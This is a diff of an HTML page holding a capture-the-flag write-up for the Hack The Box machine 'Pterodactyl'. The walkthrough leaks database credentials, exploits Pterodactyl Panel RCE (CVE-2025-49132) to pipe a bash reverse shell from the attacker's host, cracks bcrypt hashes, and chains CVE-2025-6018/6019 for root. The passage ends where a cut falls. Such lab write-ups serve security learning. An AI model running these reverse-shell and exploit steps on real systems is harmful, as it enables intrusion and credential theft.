@@ -12,32 +12,27 @@
 <body class="scanlines">
   <canvas id="hex-canvas" aria-hidden="true"></canvas>
   <div class="cursor-glow" aria-hidden="true"></div>
-
-  
-
-  <main class="page">
-    <p class="back-link"><a href="../../../../index.html">← Back to Hub</a></p>
+  <div class="site">
     
-    <header class="hero visible" id="hero" data-section>
-      <div class="hero-hex-wrap">
-        <div class="hero-hex" aria-hidden="true">
-          <span class="hero-hex-inner">HTB</span>
-        </div>
+    <p class="back-link"><a href="../../../../index.html">← Back to Hub</a></p>
+    <header class="hero visible" id="hero">
+      <canvas id="hero-canvas" aria-hidden="true"></canvas>
+      <div class="scan-line"></div>
+      <div class="hero-content">
+        <div class="hex-badge"><span class="hex-label">HTB</span></div>
+        <h1 class="site-title">Pterodactyl</h1>
+        <p class="typewriter">Medium • Linux • HTB • 2026-04-19</p>
       </div>
-      <h1 class="hero-name">Pterodactyl</h1>
-      <p class="hero-title">hard • Linux • HTB • 2026-04-19</p>
     </header>
-
-    <section class="section visible" id="content" data-section>
-      <div class="section-header">
-        <div class="section-hex" aria-hidden="true"></div>
-        <h2 class="section-title"><span>//</span> WRITEUP</h2>
+    <section class="hub-section active visible" id="content">
+      <div class="sec-header">
+        <div class="sec-hex" aria-hidden="true"></div>
+        <div class="sec-title"><span>//</span> WRITEUP</div>
       </div>
-      <article class="panel md-content"><h1>any</h1><p>ok first as we do every time start with the nmap scan </p><pre><code>❯ sudo nmap -Pn 10.129.26.208 -sCV -o scan.txt
-[sudo] password for samurai: 
+      <article class="panel-article md-content"><h1>Pterodactyl</h1>
+<p>Ok, first as we do every time, let's start with the Nmap scan.</p>
+<pre><code>❯ sudo nmap -Pn 10.129.26.208 -sCV -o scan.txt
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 09:52 +0200
-Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
-NSE Timing: About 96.54% done; ETC: 09:52 (0:00:00 remaining)
 Nmap scan report for 10.129.26.208
 Host is up (0.24s latency).
 Not shown: 971 filtered tcp ports (no-response), 25 filtered tcp ports (admin-prohibited)
@@ -52,385 +47,131 @@ PORT     STATE  SERVICE    VERSION
 443/tcp  closed https
 8080/tcp closed http-proxy
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 39.58 seconds</code></pre><p>so not that much ,but lets see what is on the web </p><p><img alt="image.png" src="image.png" /></p><p>so we have new sub , when i went for it it just redirects me to pterodactyl.htb</p><p>then when i clicked that button CHANGELOGS :</p><p><img alt="image.png" src="image%201.png" /></p><p>as u can see there is a panel for this site and with version v1.11.10 </p><p>so went to my etc/hosts to add it too and open it </p><p><img alt="image.png" src="image%202.png" /></p><p>and also searched for exploit for this version and found https://www.exploit-db.com/exploits/52341</p><p>so lets use this exploit </p><p><img alt="image.png" src="image%203.png" /></p><pre><code>❯ python3 52341.py http://panel.pterodactyl.htb/
-http://panel.pterodactyl.htb/ =&gt; pterodactyl:PteraPanel@127.0.0.1:3306/panel</code></pre><p>so we have credentials for the database USERNAME : pterodactyl , PASSWORD : PteraPanel</p><p>and found exploit on git hub which allows u to do rce <a href="https://github.com/rippsec/CVE-2025-49132-PHP-PEAR">https://github.com/rippsec/CVE-2025-49132-PHP-PEAR</a></p><p><img alt="image.png" src="image%204.png" /></p><p>this confirm the vuln so lets start abusing it </p><p><img alt="image.png" src="image%205.png" /></p><p>so lets get our shell ready </p><pre><code>❯ nano shell.sh
-
-❯ echo 'bash -i &gt;&amp; /dev/tcp/10.10.17.212/4444 0&gt;&amp;1' &gt; shell.sh
+Nmap done: 1 IP address (1 host up) scanned in 39.58 seconds</code></pre>
+<p>Not that much, but let's see what's on the web.</p>
+<p><img alt="image.png" src="image.png" /></p>
+<p>There's a new subdomain — clicking through it just redirects to <code>pterodactyl.htb</code>. Then I hit the <strong>CHANGELOGS</strong> button:</p>
+<p><img alt="image.png" src="image%201.png" /></p>
+<p>Panel version <strong>v1.11.10</strong> is visible. Added it to <code>/etc/hosts</code> and opened it up.</p>
+<p><img alt="image.png" src="image%202.png" /></p>
+<p>Searched for exploits for this version and found one on Exploit-DB: <a href="https://www.exploit-db.com/exploits/52341">https://www.exploit-db.com/exploits/52341</a></p>
+<p>Let's use it.</p>
+<p><img alt="image.png" src="image%203.png" /></p>
+<pre><code>❯ python3 52341.py http://panel.pterodactyl.htb/
+http://panel.pterodactyl.htb/ =&gt; pterodactyl:PteraPanel@127.0.0.1:3306/panel</code></pre>
+<p>Database credentials — Username: <code>pterodactyl</code>, Password: <code>PteraPanel</code>.</p>
+<p>Also found a GitHub exploit for RCE: <a href="https://github.com/rippsec/CVE-2025-49132-PHP-PEAR">https://github.com/rippsec/CVE-2025-49132-PHP-PEAR</a></p>
+<p><img alt="image.png" src="image%204.png" /></p>
+<p>Vulnerability confirmed. Let's abuse it.</p>
+<p><img alt="image.png" src="image%205.png" /></p>
+<p>Getting the reverse shell ready:</p>
+<pre><code>❯ echo 'bash -i &gt;&amp; /dev/tcp/10.10.17.212/4444 0&gt;&amp;1' &gt; shell.sh
+-----------------------------------------------------------
 ❯ cat shell.sh
 bash -i &gt;&amp; /dev/tcp/10.10.17.212/4444 0&gt;&amp;1
+-----------------------------------------------------------
 ❯ python3 -m http.server 8080
-Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
-10.129.26.208 - - [05/Apr/2026 12:30:57] &quot;GET /shell.sh HTTP/1.1&quot; 200 -</code></pre><pre><code>#then waitfor the shell 
-nc -lnvp 4444 </code></pre><pre><code>❯ python3 poc.py -H panel.pterodactyl.htb -c &quot;curl http://10.10.17.212:8080/shell.sh | bash&quot;
+Serving HTTP on 0.0.0.0 port 8080 ...
+10.129.26.208 - - [05/Apr/2026 12:30:57] &quot;GET /shell.sh HTTP/1.1&quot; 200 -</code></pre>
+<pre><code>nc -lnvp 4444</code></pre>
+<pre><code>❯ python3 poc.py -H panel.pterodactyl.htb -c &quot;curl http://10.10.17.212:8080/shell.sh | bash&quot;
 [CVE-2025-49132] Pterodactyl Panel RCE via PHP PEAR
-/ [!] Unexpected error: timed out</code></pre><p><img alt="image.png" src="image%206.png" /></p><p><img alt="image.png" src="image%207.png" /></p><p>ok ok lets start cooking , as we remember there was mairaDB on the server and we had credentials to enter it so.. </p><p><img alt="image.png" src="image%208.png" /></p><pre><code>wwwrun@pterodactyl:/var/www/pterodactyl/public&gt; /usr/bin/mariadb -h 127.0.0.1 -u pterodactyl -p'PteraPanel' panel
-&lt;db -h 127.0.0.1 -u pterodactyl -p'PteraPanel' panel
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
-Your MariaDB connection id is 663
-Server version: 11.8.3-MariaDB MariaDB package
-
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
-MariaDB [panel]&gt; show tables;
-show tables;
-+-----------------------+
-| Tables_in_panel       |
-+-----------------------+
-| activity_log_subjects |
-| activity_logs         |
-| allocations           |
-| api_keys              |
-| api_logs              |
-| audit_logs            |
-| backups               |
-| database_hosts        |
-| databases             |
-| egg_mount             |
-| egg_variables         |
-| eggs                  |
-| failed_jobs           |
-| jobs                  |
-| locations             |
-| migrations            |
-| mount_node            |
-| mount_server          |
-| mounts                |
-| nests                 |
-| nodes                 |
-| notifications         |
-| password_resets       |
-| recovery_tokens       |
-| schedules             |
-| server_transfers      |
-| server_variables      |
-| servers               |
-| sessions              |
-| settings              |
-| subusers              |
-| tasks                 |
-| tasks_log             |
-| user_ssh_keys         |
-| users                 |
-+-----------------------+
-35 rows in set (0.001 sec)
+/ [!] Unexpected error: timed out</code></pre>
+<p><img alt="image.png" src="image%206.png" /></p>
+<p><img alt="image.png" src="image%207.png" /></p>
+<p>Ok ok, let's start cooking. We already have MariaDB credentials from earlier, so let's use them.</p>
+<p><img alt="image.png" src="image%208.png" /></p>
+<pre><code>wwwrun@pterodactyl:/var/www/pterodactyl/public&gt; /usr/bin/mariadb -h 127.0.0.1 -u pterodactyl -p'PteraPanel' panel
 
 MariaDB [panel]&gt; select * from users;
-select * from users;
-+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
-| id | external_id | uuid                                 | username     | email                        | name_first | name_last | password                                                     | remember_token                                               | language | root_admin | use_totp | totp_secret | totp_authenticated_at | gravatar | created_at          | updated_at          |
-+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
-|  2 | NULL        | 5e6d956e-7be9-41ec-8016-45e434de8420 | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU | en       |          1 |        0 | NULL        | NULL                  |        1 | 2025-09-16 17:15:41 | 2025-09-16 17:15:41 |
-|  3 | NULL        | ac7ba5c2-6fd8-4600-aeb6-f15a3906982b | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | 6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8 | en       |          0 |        0 | NULL        | NULL                  |        1 | 2025-09-16 19:44:19 | 2025-11-07 18:28:50 |
-+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
-2 rows in set (0.001 sec)
++----+-------------+------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+----------+------------+
+| id | external_id | uuid             | username     | email                        | name_first | name_last | password                                                     | language | root_admin |
++----+-------------+------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+----------+------------+
+|  2 | NULL        | 5e6d956e-...     | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | en       |          1 |
+|  3 | NULL        | ac7ba5c2-...     | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | en       |          0 |
++----+-------------+------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+----------+------------+</code></pre>
+<p><code>headmonitor</code> is <code>root_admin</code>. Let's crack both hashes.</p>
+<p><img alt="image.png" src="image%209.png" /></p>
+<p>The cracked password belonged to <code>phileasfogg3</code>:</p>
+<pre><code>❯ john hashed.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
+!QAZ2wsx         (?)
 
-MariaDB [panel]&gt; </code></pre><p>as u can see the user “headmonitor” is root</p><p>lets try to crack the password </p><p><img alt="image.png" src="image%209.png" /></p><pre><code>❯ john hashed.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
-Using default input encoding: UTF-8
-Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
-Cost 1 (iteration count) is 1024 for all loaded hashes
-Will run 8 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-0g 0:00:01:10 0.04% (ETA: 2026-04-07 18:26) 0g/s 93.24p/s 187.5c/s 187.5C/s brenden..alejo
-0g 0:00:01:14 0.04% (ETA: 2026-04-07 18:28) 0g/s 93.24p/s 187.4c/s 187.4C/s bethan..quinton
-0g 0:00:01:22 0.04% (ETA: 2026-04-07 18:37) 0g/s 92.95p/s 186.7c/s 186.7C/s tilly..green2
-!QAZ2wsx         (?)     
-1g 0:00:03:51 0.16% (ETA: 2026-04-07 06:47) 0.004328g/s 120.6p/s 180.7c/s 180.7C/s frank123..barbie3
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-Session aborted
 ❯ ssh phileasfogg3@pterodactyl.htb
-The authenticity of host 'pterodactyl.htb (10.129.26.208)' can't be established.
-ED25519 key fingerprint is: SHA256:FOOqnHbybkpXftYgyrorbBxkgW0L4yMSLYxG8F87SDE
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'pterodactyl.htb' (ED25519) to the list of known hosts.
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
 (phileasfogg3@pterodactyl.htb) Password: 
 Have a lot of fun...
-Last login: Sun Apr 5 16:07:15 2026 from 10.10.17.212
-phileasfogg3@pterodactyl:~&gt; ls
-bin  user.txt
 phileasfogg3@pterodactyl:~&gt; whoami
-phileasfogg</code></pre><p>after we took access we had to make some enum about the os </p><pre><code>cat /etc/os-release
+phileasfogg3</code></pre>
+<p>Time for some OS enumeration.</p>
+<pre><code>phileasfogg3@pterodactyl:~&gt; cat /etc/os-release
 NAME=&quot;openSUSE Leap&quot;
-VERSION=&quot;15.6&quot;
-ID=&quot;opensuse-leap&quot;
-ID_LIKE=&quot;suse opensuse&quot;
-VERSION_ID=&quot;15.6&quot;
-PRETTY_NAME=&quot;openSUSE Leap 15.6&quot;
-ANSI_COLOR=&quot;0;32&quot;
-CPE_NAME=&quot;cpe:/o:opensuse:leap:15.6&quot;
-BUG_REPORT_URL=&quot;https://bugs.opensuse.org&quot;
-HOME_URL=&quot;https://www.opensuse.org/&quot;
-DOCUMENTATION_URL=&quot;https://en.opensuse.org/Portal:Leap&quot;
-LOGO=&quot;distributor-logo-Leap&quot;
-phileasfogg3@pterodactyl:~&gt; </code></pre><p>---</p><p>then after search about vuln in the os we found <a href="https://github.com/MaxKappa/opensuse-leap-privesc-exploit">https://github.com/MaxKappa/opensuse-leap-privesc-exploit</a></p><pre><code>phileasfogg3@pterodactyl:~&gt; cd /var
-phileasfogg3@pterodactyl:/var&gt; ls -al
-total 20
-drwxr-xr-x 1 root root 116 Jan  2 09:35 .
-drwxr-xr-x 1 root root 236 Jan  2 09:34 ..
--rw-r--r-- 1 root root 208 Jan  2 09:34 .updated
-drwxr-xr-x 1 root root 128 Sep 12  2025 adm
-lrwxrwxrwx 1 root root  11 Dec  5  2024 agentx -&gt; /run/agentx
-drwxr-xr-x 1 root root 110 Sep 21  2025 cache
-drwxr-xr-x 1 root root   0 Mar 15  2022 crash
-drwxr-xr-x 1 root root 540 Jan  1 09:40 lib
-lrwxrwxrwx 1 root root   9 Sep 12  2025 lock -&gt; /run/lock
-drwxr-xr-x 1 root root 558 Apr 18 19:35 log
-lrwxrwxrwx 1 root root  10 May 27  2024 mail -&gt; spool/mail
-drwxr-xr-x 1 root root   0 Mar 15  2022 opt
-lrwxrwxrwx 1 root root   4 Sep 12  2025 run -&gt; /run
-drwxr-xr-x 1 root root 108 Sep 12  2025 spool
-drwxrwxrwt 1 root root 728 Apr 18 19:35 tmp
-drwxr-xr-x 1 root root  30 Nov  7 16:59 www
-phileasfogg3@pterodactyl:/var&gt; cd mail
-phileasfogg3@pterodactyl:/var/mail&gt; ls -al
-total 4
-drwxrwxrwt 1 root         root  46 Nov  7 18:41 .
-drwxr-xr-x 1 root         root 108 Sep 12  2025 ..
--rw-rw---- 1 headmonitor  mail   0 Nov  7 15:54 headmonitor
--rw-rw---- 1 phileasfogg3 mail 960 Dec 29 15:58 phileasfogg3
-phileasfogg3@pterodactyl:/var/mail&gt; cd ph
--bash: cd: ph: No such file or directory
-phileasfogg3@pterodactyl:/var/mail&gt; cat phileasfogg3 
-From headmonitor@pterodactyl Fri Nov 07 09:15:00 2025
-Delivered-To: phileasfogg3@pterodactyl
-Received: by pterodactyl (Postfix, from userid 0)
-id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)
-From: headmonitor headmonitor@pterodactyl
-To: All Users all@pterodactyl
+VERSION=&quot;15.6&quot;</code></pre>
+<hr />
+<h2>Privilege Escalation</h2>
+<p>Checking the mail spool:</p>
+<pre><code>phileasfogg3@pterodactyl:/var/mail&gt; cat phileasfogg3
+
 Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
-Message-ID: 202511070915.headmonitor@pterodactyl
-Date: Fri, 07 Nov 2025 09:15:00 +0100
-MIME-Version: 1.0
-Content-Type: text/plain; charset=&quot;utf-8&quot;
-Content-Transfer-Encoding: 7bit
 
 Attention all users,
+Unusual activity has been observed from the udisks daemon (udisksd).
+Do not connect untrusted external media. Review your sessions for suspicious activity.
+Administrators should review udisks and system logs and apply pending updates.
 
-Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.
+— HeadMonitor, System Administrator</code></pre>
+<p>The admin is hinting at something with <code>udisks</code>. A quick search led to this: <a href="https://success.qualys.com/discussions/s/article/000008043">https://success.qualys.com/discussions/s/article/000008043</a></p>
+<p>It chains two vulnerabilities together — <strong>CVE-2025-6018 + CVE-2025-6019</strong>.</p>
+<p>To clarify quickly: <code>polkit</code> is the system responsible for controlling permissions for disk and mount operations on Linux. When a user triggers certain actions, polkit classifies the session into one of three levels:</p>
+<table><thead><tr><th>Level</th><th>Meaning</th><th>Example</th></tr></thead><tbody><tr><td><strong>allow_active</strong></td><td>User is physically at the machine (console or GUI)</td><td>Highest privilege</td></tr><tr><td><strong>allow_inactive</strong></td><td>Local user but not active</td><td>Mid-level</td></tr><tr><td><strong>allow_any</strong></td><td>Any session — including remote (SSH, VNC)</td><td>Lowest privilege</td></tr></tbody></table>
+<pre><code>CVE-2025-6019 – libblockdev / udisks LPE
 
-Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.
+Exploitable by &quot;allow_active&quot; users.
+Allows mounting malicious images with improper security flags (nosuid, nodev) to gain full root privileges.</code></pre>
+<p>We can chain both CVEs to get a root shell ;) </p>
+<p>Cloning the exploit:<a href="https://github.com/DesertDemons/CVE-2025-6018-6019.git">https://github.com/DesertDemons/CVE-2025-6018-6019.git</a></p>
+<pre><code>git clone https://github.com/DesertDemons/CVE-2025-6018-6019.git</code></pre>
+<p>Hosting it and pulling it to the victim:</p>
+<pre><code>curl http://my_ip:port/exploit.sh -o exploit.sh</code></pre>
+<p>Checking for vulnerabilities:</p>
+<pre><code>phileasfogg3@pterodactyl:~&gt; ./exploit.sh --check
 
-Report any signs of compromise immediately to headmonitor@pterodactyl.htb
+[*] Running full vulnerability check...
+[+] All dependencies found
+[+] pam_env.so found in PAM configuration
+[+] pam_systemd.so found - escalation vector available
+[*] Detected OS: openSUSE Leap 15.6
+[+] Target OS is vulnerable (openSUSE/SLES)
+[+] udisksctl found
+[+] Polkit rules allow drive-mount/filesystem-mount
+[!] CVE-2025-6018: VULNERABLE
+[!] CVE-2025-6019: VULNERABLE
+[!] EXPLOIT CHAIN: POSSIBLE</code></pre>
+<p>Vulnerable. Let's go.</p>
+<pre><code>phileasfogg3@pterodactyl:~&gt; ./exploit.sh --exploit
 
-— HeadMonitor
-System Administrator
-</code></pre><p>as u can see the admin is talking about somthing in the udisks </p><p>so we should search for something about this https://success.qualys.com/discussions/s/article/000008043 </p><p>it combines two vulns together <strong>CVE-2025-6018 + CVE-2025-6019 Exploit Chain as it says in the blog</strong> </p><ul><li>Allow User</li></ul><p>    طيب تعال هيك نتكلم عربي ونشرح : </p><p>    طيب في شي اسمه polkit الي هو نظام بيدير ال mounts على الجهاز وكمان ال disks والصلاحيات عليها </p><p>    طيب لما يوزر يعمل action بيروح هاد بيشوف شو انت من التلات حاجات الي هم : </p><p>    | المستوى | يعني إيه؟ | مثال |</p><p>    | --- | --- | --- |</p><p>    | <strong>allow_active</strong> | اليوزر <strong>active</strong> (جالس قدام الجهاز فعلياً – local console أو GUI session) | أكثر صلاحية |</p><p>    | <strong>allow_inactive</strong> | اليوزر local بس <strong>مش active</strong> (مثلاً فتحت terminal جديد أو switched console) | أقل صلاحية |</p><p>    | <strong>allow_any</strong> | أي session، حتى لو remote (SSH، VNC، إلخ) | أقل صلاحية عادة |</p><p>    &gt; </p><p>    &gt; </p><p>    &gt; </p><p>    &gt; الـ CVE-2025-6018 (PAM Injection عبر ~/.pam_environment) بيخدع <strong>systemd-logind</strong> عشان يعتقد إن session بتاعتك <strong>active console</strong> (كأنك قاعد قدام الشاشة).</p><p>    &gt; </p><p>    &gt; لما تنجح في ده → الـ session بتاعتك تصير <strong>Active=yes</strong> → Polkit يديك <strong>allow_active</strong> privileges.</p><p>    &gt; </p><p>    &gt; وبعدين تقدر تستخدم udisks2 (CVE-2025-6019) عشان تعمل الـ XFS race condition وتصير root.</p><p>    &gt; </p><p>    ```jsx</p><p>    CVE-2025-6019 – libblockdev / udisks LPE</p><p>    Affected Systems: Most Linux distributions with udisks daemon</p><p>    Description:</p><p>    Exploitable by “allow_active” users.</p><p>    Allows mounting malicious images with improper security flags (nosuid, nodev) to gain full root privileges.</p><p>    Impact: Local attacker can achieve full root access.</p><p>    ```</p><p>    as u can see we can chain them to get our root shell ;) </p><p>    now lets get our exploit to put it on the victim system </p><p>    ```bash</p><p>    git clone https://github.com/DesertDemons/CVE-2025-6018-6019.githi</p><p>    ```</p><p>    and started python server to uploud the exploit on the host “victim”</p><p>    and in the host </p><p>    ```bash</p><p>    curl http://my_ip:port/exploit.sh -o exploit.sh </p><p>    ```</p><p>    and lets start setting up the exploit and check for the vulns </p><p>    ```bash</p><p>    phileasfogg3@pterodactyl:~&gt; ./exploit.sh --check</p><p>    ╔═══════════════════════════════════════════════════════════════╗</p><p>    ║         CVE-2025-6018 + CVE-2025-6019 Exploit                 ║</p><p>    ║      PAM Bypass + udisks2 XFS Race Condition LPE             ║</p><p>    ║                                                               ║</p><p>    ║  Author: DesertDemons                                         ║</p><p>    ║  GitHub: github.com/DesertDemons/CVE-2025-6018-6019          ║</p><p>    ╚═══════════════════════════════════════════════════════════════╝</p><p>    [*] Running full vulnerability check...</p><p>    [*] Checking dependencies...</p><p>    [+] All dependencies found</p><p>    [*] Checking PAM configuration (CVE-2025-6018)...</p><p>    [+] pam_env.so found in PAM configuration</p><p>    [+] pam_systemd.so found - escalation vector available</p><p>    [*] Detected OS: openSUSE Leap 15.6</p><p>    [+] Target OS is vulnerable (openSUSE/SLES)</p><p>    [*] Checking udisks2 configuration (CVE-2025-6019)...</p><p>    [*] udisks2 version: unknown</p><p>    [+] XFS filesystem support available</p><p>    [+] Polkit allows loop-setup for active users</p><p>    [*] Checking allow_active status...</p><p>    [!] allow_active status: NO (got: ('challenge',))</p><p>        You need to setup PAM bypass first (--setup)</p><p>    phileasfogg3@pterodactyl:~&gt; ./exploit.sh --setup</p><p>    ╔═══════════════════════════════════════════════════════════════╗</p><p>    ║         CVE-2025-6018 + CVE-2025-6019 Exploit                 ║</p><p>    ║      PAM Bypass + udisks2 XFS Race Condition LPE             ║</p><p>    ║                                                               ║</p><p>    ║  Author: DesertDemons                                         ║</p><p>    ║  GitHub: github.com/DesertDemons/CVE-2025-6018-6019          ║</p><p>    ╚═══════════════════════════════════════════════════════════════╝</p><p>    [*] Setting up PAM bypass (CVE-2025-6018)...</p><p>    [+] Created /home/phileasfogg3/.pam_environment</p><p>        Contents:</p><p>        XDG_SEAT=seat0</p><p>        XDG_VTNR=1</p><p>    [!] IMPORTANT: You must now:</p><p>        1. Exit this SSH session completely</p><p>        2. SSH back into the target</p><p>        3. Run: su - phileasfogg3</p><p>        4. Enter your password</p><p>        5. Then run this script with --exploit &lt;image_path&gt;</p><p>    [*] After reconnecting, verify with: ./exploit.sh --check</p><p>    phileasfogg3@pterodactyl:~&gt; ./exploit.sh --check</p><p>    ╔═══════════════════════════════════════════════════════════════╗</p><p>    ║         CVE-2025-6018 + CVE-2025-6019 Exploit                 ║</p><p>    ║      PAM Bypass + udisks2 XFS Race Condition LPE             ║</p><p>    ║                                                               ║</p><p>    ║  Author: DesertDemons                                         ║</p><p>    ║  GitHub: github.com/DesertDemons/CVE-2025-6018-6019          ║</p><p>    ╚═══════════════════════════════════════════════════════════════╝</p><p>    [*] Running full vulnerability check...</p><p>    [*] Checking dependencies...</p><p>    [+] All dependencies found</p><p>    [*] Checking PAM configuration (CVE-2025-6018)...</p><p>    [+] pam_env.so found in PAM configuration</p><p>    [+] pam_systemd.so found - escalation vector available</p><p>    [*] Detected OS: openSUSE Leap 15.6</p><p>    [+] Target OS is vulnerable (openSUSE/SLES)</p><p>    [*] Checking udisks2 configuration (CVE-2025-6019)...</p><p>    [*] udisks2 version: unknown</p><p>    [+] XFS filesystem support available</p><p>    [+] Polkit allows loop-setup for active users</p><p>    [*] Checking allow_active status...</p><p>    [!] allow_active status: NO (got: ('challenge',))</p><p>        You need to setup PAM bypass first (--setup)</p><p>    phileasfogg3@pterodactyl:~&gt; ls -al</p><p>    total 44</p><p>    drwxr-xr-x 1 phileasfogg3 users   208 Apr 18 20:13 .</p><p>    drwxr-xr-x 1 root         root     46 Nov  7 18:41 ..</p><p>    lrwxrwxrwx 1 root         root      9 Dec 31 17:29 .bash_history -&gt; /dev/null</p><p>    -rw-r--r-- 1 phileasfogg3 users  1177 Aug 22  2024 .bashrc</p><p>    drwx------ 1 phileasfogg3 users     0 Mar 15  2022 .cache</p><p>    drwx------ 1 phileasfogg3 users     0 Mar 15  2022 .config</p><p>    -rw-r--r-- 1 phileasfogg3 users  1637 Apr  9  2018 .emacs</p><p>    drwxr-xr-x 1 phileasfogg3 users     0 Mar 15  2022 .fonts</p><p>    -rw-r--r-- 1 phileasfogg3 users   861 Apr  9  2018 .inputrc</p><p>    drwx------ 1 phileasfogg3 users     0 Mar 15  2022 .local</p><p>    -rw-r--r-- 1 phileasfogg3 users    26 Apr 18 20:13 .pam_environment</p><p>    -rw-r--r-- 1 phileasfogg3 users  1028 Aug 22  2024 .profile</p><p>    drwxr-xr-x 1 phileasfogg3 users     0 Mar 15  2022 bin</p><p>    -rwxr-xr-x 1 phileasfogg3 users 15903 Apr 18 20:13 exploit.sh</p><p>    -rw-r--r-- 1 root         root     33 Apr 18 19:35 user.txt</p><p>    phileasfogg3@pterodactyl:~&gt; exit </p><p>    logout</p><p>    Connection to pterodactyl.htb closed.</p><p>    ❯ ssh phileasfogg3@pterodactyl.htb</p><p>    ** WARNING: connection is not using a post-quantum key exchange algorithm.</p><p>    ** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.</p><p>    ** The server may need to be upgraded. See https://openssh.com/pq.html</p><p>    (phileasfogg3@pterodactyl.htb) Password: </p><p>    Have a lot of fun...</p><p>    Last login: Sat Apr 18 19:39:43 2026 from 10.10.17.212</p><p>    Last login: Sat Apr 18 20:24:30 2026 from 10.10.17.212</p><p>    phileasfogg3@pterodactyl:~&gt; su - phileasfogg3</p><p>    Password: </p><p>    phileasfogg3@pterodactyl:~&gt; ./exploit.sh --check</p><p>    ╔═══════════════════════════════════════════════════════════════╗</p><p>    ║         CVE-2025-6018 + CVE-2025-6019 Exploit                 ║</p><p>    ║      PAM Bypass + udisks2 XFS Race Condition LPE             ║</p><p>    ║                                                               ║</p><p>    ║  Author: DesertDemons                                         ║</p><p>    ║  GitHub: github.com/DesertDemons/CVE-2025-6018-6019          ║</p><p>    ╚═══════════════════════════════════════════════════════════════╝</p><p>    [*] Running full vulnerability check...</p><p>    [*] Checking dependencies...</p><p>    [+] All dependencies found</p><p>    [*] Checking PAM configuration (CVE-2025-6018)...</p><p>    [+] pam_env.so found in PAM configuration</p><p>    [+] pam_systemd.so found - escalation vector available</p><p>    [*] Detected OS: openSUSE Leap 15.6</p><p>    [+] Target OS is vulnerable (openSUSE/SLES)</p><p>    [*] Checking udisks2 configuration (CVE-2025-6019)...</p><p>    [*] udisks2 version: unknown</p><p>    [+] XFS filesystem support available</p><p>    [+] Polkit allows loop-setup for active users</p><p>    [*] Checking allow_active status...</p><p>    [+] allow_active status: YES</p><p>        You have allow_active privileges!</p><p>    [*] Checking session details...</p><p>    [*] Session ID: 52</p><p>        Seat: seat0</p><p>        Active: yes</p><p>        Type: tty</p><p>    [+] Session is properly configured for exploitation</p><p>    [*] Vulnerability check complete</p><p>    phileasfogg3@pterodactyl:~&gt; </p><p>    ```</p><p>    as u can see the target is vulnerable for both vulns </p><p>    lets make our image to start exploiting </p><p>    &gt; now its the next day after alot of trying the exploit was not working bcs of the flags was not compatible with the opensuse , so i had to go with ai to search for solution for this and did this</p><p>    &gt; </p><p>    ```bash</p><p>    mkdir /mnt/xfs</p><p>    ```</p><p>    ```bash</p><p>    ❯ dd if=/dev/zero of=xfs.image bs=1M count=300</p><p>    300+0 records in</p><p>    300+0 records out</p><p>    314572800 bytes (315 MB, 300 MiB) copied, 0.0525506 s, 6.0 GB/s</p><p>    ```</p><p>    ```bash</p><p>    ❯ mkfs.xfs \</p><p>      -m bigtime=0,inobtcount=0 \</p><p>      -i nrext64=0,exchange=0 \</p><p>      xfs.image</p><p>    ```</p><p>    ```bash</p><p>    ❯ sudo mount -o loop xfs.image /mnt/xfs</p><p>    ```</p><p>    ```bash</p><p>    ❯ scp phileasfogg3@pterodactyl.htb:/bin/bash /tmp/bash_target</p><p>    ** WARNING: connection is not using a post-quantum key exchange algorithm.</p><p>    ** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.</p><p>    ** The server may need to be upgraded. See https://openssh.com/pq.html</p><p>    (phileasfogg3@pterodactyl.htb) Password: 